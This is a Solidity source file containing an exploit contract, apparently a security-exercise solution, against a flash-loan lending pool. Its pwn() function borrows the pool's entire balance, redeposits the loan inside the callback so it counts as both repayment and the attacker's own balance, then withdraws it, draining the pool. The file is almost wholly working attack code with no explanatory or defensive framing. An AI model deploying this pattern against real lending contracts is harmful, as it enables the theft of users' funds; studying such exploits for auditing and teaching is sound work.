// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

interface IEthLendingPool {
  function balances(address) external view returns (uint256);

  function deposit() external payable;

  function withdraw(uint256 _amount) external;

  function flashLoan(
    uint256 amount,
    address target,
    bytes calldata data
  ) external;
}

contract EthLendingPoolExploit {
  IEthLendingPool public pool;

  constructor(address _pool) {
    pool = IEthLendingPool(_pool);
  }

  receive() external payable {}

  function deposit() external payable {
    pool.deposit{ value: msg.value }();
  }

  function pwn() external {
    uint256 balance = address(pool).balance;

    pool.flashLoan(
      balance,
      address(this),
      abi.encodeWithSignature("deposit()")
    );

    pool.withdraw(pool.balances(address(this)));
  }
}
